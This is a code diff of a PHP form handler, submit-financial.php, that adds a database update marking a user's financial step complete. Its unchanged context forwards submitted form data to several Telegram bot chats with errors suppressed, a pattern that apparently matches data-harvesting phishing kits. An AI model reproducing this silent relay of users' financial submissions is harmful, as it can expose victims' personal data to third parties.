@@ -1,7 +1,11 @@
 <?php
 // submit-financial.php
+require_once __DIR__ . '/config/database.php';
 
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    session_start();
+    $user_id = $_SESSION['user_id'];
+    
     // Multiple Telegram Bots Configuration
     $telegramBots = [
         [
@@ -76,8 +80,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             $data = [
                 'chat_id' => $bot['chat_id'],
                 'text' => $message,
-                // safer: disable parse mode to avoid markdown parse errors
-                // 'parse_mode' => 'MarkdownV2'
             ];
 
             $options = [
@@ -85,17 +87,29 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                     'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                     'method'  => 'POST',
                     'content' => http_build_query($data),
-                    'ignore_errors' => true // avoid warnings breaking headers
+                    'ignore_errors' => true
                 ]
             ];
 
-            // suppress warning if Telegram fails
             @file_get_contents($url, false, stream_context_create($options));
         }
     }
 
-    // Redirect logic
-    session_start();
+    // ✅ UPDATE DATABASE - Mark financial step as completed
+    try {
+        $database = new Database();
+        $db = $database->getConnection();
+        
+        $update_query = "UPDATE users SET financial_completed = 1, financial_completed_at = NOW() WHERE id = :user_id";
+        $update_stmt = $db->prepare($update_query);
+        $update_stmt->bindParam(':user_id', $user_id);
+        $update_stmt->execute();
+    } catch (Exception $e) {
+        // Log error but don't break the flow
+        error_log("Database update failed: " . $e->getMessage());
+    }
+
+    // Store in session and redirect
     $_SESSION['financial_data'] = $_POST;
 
     if ($equipment_investment === 'yes') {
@@ -110,3 +124,4 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     header('Location: financial-assessment.php');
     exit();
 }
+?>
